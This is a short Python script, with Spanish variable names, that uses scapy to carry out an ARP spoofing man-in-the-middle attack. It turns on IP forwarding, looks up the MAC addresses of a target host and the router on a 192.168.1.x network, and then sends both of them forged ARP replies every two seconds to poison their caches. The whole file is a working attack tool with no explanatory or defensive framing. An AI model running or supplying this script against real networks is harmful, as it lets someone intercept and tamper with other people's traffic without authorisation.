import scapy.all as scapy
import time
import subprocess


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    final = broadcast / arp_request

    (resultado, nosirve) = scapy.srp(final, timeout=1)
    variable = resultado[0][1].hwsrc
    return variable


def mandarpeticion(ip_ataque, ip_falso,macA):
    mac = macA
    print(mac)
    paquete = scapy.ARP(op=2, pdst=ip_ataque, hwdst=mac, psrc=ip_falso)
    print(paquete.summary())
    scapy.send(paquete)


subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
variableataque = scan("192.168.1.22")
variableRouter = scan("192.168.1.1")
try:
    while True:
        mandarpeticion("192.168.1.22", "192.168.1.1", variableataque)
        mandarpeticion("192.168.1.1", "192.168.1.22", variableRouter)
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] se ha interrumpido la conexion")
